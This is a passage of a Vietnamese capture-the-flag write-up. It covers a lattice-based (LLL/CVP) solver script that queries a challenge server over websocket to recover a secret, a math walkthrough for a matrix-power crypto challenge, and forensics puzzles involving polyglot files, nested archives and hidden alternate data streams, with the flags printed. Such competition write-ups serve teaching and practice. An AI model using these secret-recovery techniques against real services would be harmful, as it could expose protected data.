        return False
    for p, r in pairs:
        if x % p != r % p and x % p != (-r) % p:
            return False
    return True


def recover_secret(pairs):
    pairs = dedupe_pairs(pairs)
    ps = [p for p, _ in pairs]
    rs = [r for _, r in pairs]
    n = len(pairs)

    x0, M = crt(rs, ps)

    deltas = []
    for p, r in pairs:
        m = M // p
        delta = ((-2 * r) % p) * m * pow(m, -1, p)
        deltas.append(delta % M)

    for shift in (0, 4, -4, 8, -8, 12, -12):
        K = 1 << (SECRET_BITS + shift)

        A = IntegerMatrix(n + 1, n + 1)
        for i, t in enumerate(deltas):
            A[i, i] = K
            A[i, n] = int(t)
        A[n, n] = int(M)

        target = [K // 2] * n + [-int(x0)]

        LLL.reduction(A, delta=0.99)
        v = CVP.closest_vector(A, target)

        signed = int(v[-1]) + x0

        for cand in (signed, -signed, signed % M, (-signed) % M):
            if valid_candidate(cand, pairs):
                return cand

    raise RuntimeError("Không recover được secret")


def solve(url):
    ws = websocket.create_connection(url, timeout=PROMPT_TIMEOUT)

    try:
        print(recv_until(ws, "Option: "), end="")

        pairs = []

        for i in range(QUERY_COUNT):
            ws.send("1\n")
            out = recv_until(ws, "Option: ", regex=PAIR_RE)
            print(out, end="")

            m = PAIR_RE.search(out)
            if not m:
                raise RuntimeError(f"Không parse được output: {out!r}")

            pairs.append((int(m.group(1)), int(m.group(2))))

            if "Option: " not in out:
                print(recv_until(ws, "Option: "), end="")

        print(f"\n[+] Collected {len(pairs)} pairs")
        print("[+] Recovering secret...")

        secret_num = recover_secret(pairs)
        secret_hex = f"{secret_num:0{SECRET_BYTES * 2}x}"

        print("[+] Secret:")
        print(secret_hex)

        ws.send("2\n")
        print(recv_until(ws, "What is the secret? "), end="")

        ws.send(secret_hex + "\n")

        final = recv_until(
            ws,
            regex=re.compile(r"Correct!|SUSSSSSS|reward|BKISC\{"),
            timeout=10.0,
        )
        print(final, end="")

    finally:
        ws.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} '<wss-url>'")
        sys.exit(1)

    solve(sys.argv[1])
```

![[Pasted image 20260509104859.png]]

>Flag: BKISC{7h15_15_cryp70_f0r_k1nd3r94r73n_755745e46856}
---

## Matrix

Let play with the matrix!

---
  
Ta có ma trận ban đầu:  
$$  
M =  
\begin{pmatrix}  
a & b \\  
c & d  
\end{pmatrix}  
\in \mathrm{GF}(p)^{2 \times 2}  
$$
Trong đó \(a,b,c,d\) là 4 block, mỗi block dài 16 bytes của phần secret trong flag.  
  
Challenge tính:  
$$  
C = M  
$$
Sau đó lặp 31337 lần:  
$$  
C \leftarrow C^{1337}  
$$
Vì vậy sau vòng lặp ta có:  
$$  
C = M^{1337^{31337}}  
$$
Đặt:  
$$  
E = 1337^{31337}  
$$
nên:  
$$  
C = M^E  
$$
Challenge leak:  
$$  
\mathrm{eigenvalues}(C)  
$$
và prefix của hai phần tử:  
$$  
C_{0,0}  
$$
$$  
C_{0,1}  
$$
Gọi hai eigenvalue của ma trận gốc \(M\) là:  
$$  
\lambda, \mu  
$$
Vì:  
$$  
C = M^E  
$$
nên eigenvalue của \(C\) là:  
$$  
\lambda^E, \mu^E  
$$
Ta làm việc trong trường mở rộng:  
$$  
\mathrm{GF}(p^2)  
$$
Nhóm nhân của trường này có order:  
$$  
p^2 - 1  
$$
Ta tính được:  
$$  
\gcd(E, p^2 - 1) = 1337  
$$
Do đó phương trình:  
$$  
x^E = y  
$$
có tối đa \(1337\) nghiệm trong \(\mathrm{GF}(p^2)\).  
  
Với mỗi eigenvalue leak được của \(C\), ta tìm các nghiệm:  
$$  
x^E = \eta  
$$
trong đó (eta) là eigenvalue của (C)
  
Vì \(M\) có hệ số trong \(\mathrm{GF}(p)\), hai eigenvalue của \(M\) liên hệ bởi Frobenius:  
$$  
\mu = \lambda^p  
$$
Sau khi thử các nghiệm, ta thu được:  
$$  
T = \mathrm{tr}(M) = a + d  
$$
và:  
$$  
D = \det(M) = ad - bc \pmod p  
$$
Cụ thể:  
$$  
T =  
147246289880398374907816118880461220503  
$$
$$  
D =  
50208670257123141246486474014406511586954782406442639151138335328926228142603  
$$
Với ma trận (2 x 2), theo định lý Cayley-Hamilton, mọi lũy thừa của (M) đều có thể viết dưới dạng:  
$$  
M^E = L M + R I  
$$
Trong đó \(I\) là ma trận đơn vị.  
Suy ra:  
$$  
C = L M + R I  
$$
hay:  
$$  
\begin{pmatrix}  
C_{0,0} & C_{0,1} \\  
C_{1,0} & C_{1,1}  
\end{pmatrix}  
=  
L  
\begin{pmatrix}  
a & b \\  
c & d  
\end{pmatrix}  
+  
R  
\begin{pmatrix}  
1 & 0 \\  
0 & 1  
\end{pmatrix}  
$$
Do đó:  
$$  
C_{0,0} = La + R \pmod p  
$$
$$  
C_{0,1} = Lb \pmod p  
$$
$$  
C_{1,0} = Lc \pmod p  
$$
$$  
C_{1,1} = Ld + R \pmod p  
$$
Từ eigenvalue, ta tính được \(L, R\) bằng nội suy:  
$$  
L = \frac{\eta_1 - \eta_2}{\lambda - \mu}  
$$
$$  
R = \eta_1 - L\lambda  
$$
Trong bài này:  
$$  
L =  
19461213854642379279077062456717514413517173429427692973579632259755887358058  
$$
$$  
R =  
60949461241120944309390215544813268473880116602122468688634756614366938108327  
$$
Từ leak:  
$$  
C_{0,1} = Lb \pmod p  
$$
Ta biết prefix thập phân của \(C_{0,1}\):  
$$  
\mathrm{prefix}(C_{0,1}) =  
437561477922777662981107858757923689  
$$
Gọi prefix này là \(P\).  
Nếu độ dài thập phân đầy đủ của \(C_{0,1}\) là \(\ell\), thì \(C_{0,1}\) nằm trong khoảng:  
$$  
P \cdot 10^{\ell - 36}  
\le C_{0,1}  
<  
(P+1) \cdot 10^{\ell - 36}  
$$
Mặt khác:  
$$  
C_{0,1} \equiv Lb \pmod p  
$$
nên tồn tại số nguyên \(k\) sao cho:  
$$  
Lb - kp = C_{0,1}  
$$
Vậy ta cần tìm \(b\) thỏa:  
$$  
P \cdot 10^{\ell - 36}  
\le  
Lb - kp  
<  
(P+1) \cdot 10^{\ell - 36}  
$$
Ngoài ra \(b\) là 16 bytes printable, nên:  
$$  
b = \sum_{i=0}^{15} b_i 256^{15-i}  
$$
với:  
$$  
32 \le b_i \le 126  
$$
Dùng LLL/CVP để giải bài toán xấp xỉ tuyến tính trên, ta thu được:  
$$  
b = \texttt{b16374051e7b2db6}  
$$
Ta đã biết:  
$$  
a + d = T  
$$
và:  
$$  
ad - bc \equiv D \pmod p  
$$
Vì \(a,d\) đều là 16 bytes printable nên ta xét theo từng byte.  
Viết:  
$$  
a = \sum_{i=0}^{15} a_i 256^i  
$$
$$  
d = \sum_{i=0}^{15} d_i 256^i  
$$
$$  
T = \sum_{i=0}^{15} T_i 256^i  
$$
Do các byte printable nằm trong khoảng (32,126), khi cộng từng byte không bị carry vì:  
$$  
126 + 126 = 252 < 256  
$$
nên:  
$$  
a_i + d_i = T_i  
$$
Suy ra:  
$$  
d_i = T_i - a_i  
$$
Tiếp theo, determinant thực tế có dạng:  
$$  
ad - bc = D + kp  
$$
Trong nghiệm đúng của bài này:  
$$  
ad - bc = D - p  
$$
Tương đương:  
$$  
bc - ad = p - D  
$$
Đặt:  
$$  
K = p - D  
$$
Ta cần giải:  
$$  
bc - ad = K  
$$
Viết theo cơ số \(256\): 
$$  
b = \sum_{i=0}^{15} b_i 256^i  
$$
$$  
c = \sum_{i=0}^{15} c_i 256^i  
$$
$$  
a = \sum_{i=0}^{15} a_i 256^i  
$$
$$  
d = \sum_{i=0}^{15} d_i 256^i  
$$
Khi đó hệ số bậc \(n\) của \(bc - ad\) là:  
$$  
\sum_{i=0}^{n} b_i c_{n-i}  
-  
\sum_{i=0}^{n} a_i d_{n-i}  
$$
Tính kèm carry, ta có điều kiện:  
$$  
\mathrm{carry}_n  
+  
\sum_{i=0}^{n} b_i c_{n-i}  
-  
\sum_{i=0}^{n} a_i d_{n-i}  
-  
K_n  
\equiv 0 \pmod {256}  
$$
Sau đó carry mới là:  
$$  
\mathrm{carry}_{n+1}  
=  
\frac{  
\mathrm{carry}_n  
+  
\sum_{i=0}^{n} b_i c_{n-i}  
-  
\sum_{i=0}^{n} a_i d_{n-i}  
-  
K_n  
}{256}  
$$
Với mỗi byte \(a_i\), ta có:  
$$  
32 \le a_i \le 126  
$$
và:  
$$  
32 \le d_i = T_i - a_i \le 126  
$$
Với mỗi byte \(c_i\), ta cũng có:  
$$  
32 \le c_i \le 126  
$$
DFS theo từng byte và kiểm tra điều kiện modulo \(256\), ta tìm được:  
$$  
a = \texttt{7c6684ff4a69f86f}  
$$
$$  
b = \texttt{b16374051e7b2db6}  
$$
$$  
c = \texttt{c0497f02e1f2d49b}  
$$
$$  
d = \texttt{7cdb005873941541}  
$$
Ta có:  
$$  
C_{0,0} = La + R \pmod p  
$$
và kết quả bắt đầu bằng:  
$$  
504431219805193233494638855346643150  
$$
Đúng với leak của challenge.  
Tương tự:  
$$  
C_{0,1} = Lb \pmod p  
$$
và kết quả bắt đầu bằng:  
$$  
437561477922777662981107858757923689  
$$
Cũng đúng với leak
Secret gồm 4 block:  
$$  
a \parallel b \parallel c \parallel d  
$$
Do đó:  
$$  
\text{secret}  
=  
\texttt{7c6684ff4a69f86f}  
\parallel  
\texttt{b16374051e7b2db6}  
\parallel  
\texttt{c0497f02e1f2d49b}  
\parallel  
\texttt{7cdb005873941541}  
$$

>Flag: BKISC{7c6684ff4a69f86fb16374051e7b2db6c0497f02e1f2d49b7cdb005873941541}
---

# Mics

## Confusion

Wdym you can "read" the image? "Play" the image too? Nah you capping bruh.

---

Ban đầu mình kiểm tra file bằng `file`
![[Pasted image 20260509140649.png]]

Mặc dù file có đuôi `.png`, nó lại không được nhận diện là PNG chuẩn. Tiếp tục dùng `strings` để xem có dữ liệu đáng nghi không thì thấy xuất hiện nhiều signature của các định dạng khác nhau
![[Pasted image 20260509140606.png]]
Điều này gợi ý file là một dạng **polyglot file**, tức là một file chứa nhiều định dạng khác nhau bên trong

Dùng Python để tìm signature của PDF, MP4 và PNG
```python 
from pathlib import Path

data = Path("chall.png").read_bytes()

sigs = {
    "PDF": b"%PDF-",
    "MP4 ftyp": b"ftyp",
    "PNG": b"\x89PNG\r\n\x1a\n",
}

for name, sig in sigs.items():
    print(name, hex(data.find(sig)))
```

![[Pasted image 20260509140832.png]]

Ở đây:
- PDF bắt đầu tại offset `0x1b`.
- MP4 có `ftyp` tại `0x104`, nên header MP4 bắt đầu từ `0x100`.
- Có một PNG khác được nhúng tại offset `0x478d`.
File này thực chất chứa nhiều lớp dữ liệu: PDF, MP4 và PNG.

Mình dùng `ffprobe`/`ffmpeg` với file gốc để extract frames ra
![[Pasted image 20260509141249.png]]

Sau khi xem các frame, thấy phần đầu của flag xuất hiện ở dưới video
![[Pasted image 20260509141130.png]]

Do file có PDF header tại offset `0x1b`, ta có thể đọc trực tiếp bằng `pdftotex`
![[Pasted image 20260509141544.png]]
Ghép lại mình được flag

>Flag: BKISC{bUy_0n3_g37_7W0_aHh_f1lE}
---

## Zopslop

The flag is hidden inside the attachment.

---

Kiểm tra `step_1.zip`
```
zipinfo -v step_1.zip
```
![[Pasted image 20260510205634.png]]
Tức là `step_1.zip` bị ghép 2 ZIP vào nhau. ZIP thật bắt đầu ở offset `1733`, còn phần đầu cũng là một ZIP ẩn.

Nên mình đã carve ra
![[Pasted image 20260510205731.png]]

Giải nén `suffix.zip` sẽ ra `step_2.png`, nhưng đó là QR Rickroll, chỉ là mồi nhử.
![[Pasted image 20260510205948.png]]

QR decode ra:
```url
https://www.youtube.com/watch?v=dQw4w9WgXcQ
```

Vì vậy mình bỏ qua và tiếp tục kiểm tra với file `prefix.zip`, mình giải nén và thu được 2 file là `zip_password.txt` và `step_2.zip`.
![[Pasted image 20260510210102.png]]

Nội dung file password thu được là
```zip_password.txt
super_duper_omega_very_secret_password_hehehehehehe_not_guessy_at_all_10957129085701395809137580139758013957813095713
```

Giải nén **step_2.zip** với winrar thu được2 file
![[Pasted image 20260510215918.png]]

File `zip_password` tiếp theo chứa toàn ký tự whitespace Unicode. Mỗi ký tự whitespace đại diện cho một nibble hex
```python
from pathlib import Path

m = {
    "\u0085": "0", "\u00a0": "1", "\u2000": "2", "\u2001": "3",
    "\u2002": "4", "\u2003": "5", "\u2004": "6", "\u2005": "7",
    "\u2006": "8", "\u2007": "9", "\n": "e", " ": "f",
}

try:
    s = Path("zip_password").read_text("utf-8")
    hex_str = "".join(m[c] for c in s if c in m)

    hex_str = hex_str[:len(hex_str) // 2 * 2]

    rar_pwd = bytes.fromhex(hex_str).decode()
    print(f"Password: {rar_pwd}")
except Exception as e:
    print(f"Lỗi: {e}")
```

Chạy script và thu được password
![[Pasted image 20260510212555.png]]
```
white_space_encoding_is_not_that_guessy_right_or_is_it?_09178093762985078932p587892305873298057129851987513987
```

Tiếp đến mình giải nén file step_3.rar, RAR này là RAR5 bên ngoài thấy có `decrypt.py`, nhưng `encrypt.bin` bị giấu trong RAR service block.
![[Pasted image 20260510213311.png]]

Trong `decrypt.py` có key và IV
```
key = b"bkisctfisthebest"
iv = b"theremustbesmthg"
```

Payload cần decrypt là `encrypt.bin`, nhưng file này nằm trong service stream của RAR. 
Mình dùng strings để kiểm tra thì thấy có stream ẩn
![[Pasted image 20260510215045.png]]

Vì vậy mình cần khai thác kỹ thuật giấu tin bằng **NTFS Alternate Data Streams (ADS)** để lấy được nội dung file **encrypt.bin**
![[Pasted image 20260510214802.png]]

Cuối cùng là decode AES
![[Pasted image 20260510215345.png]]

>Flag: BKISC{h0w_d1d_y0u_gue55_1t?}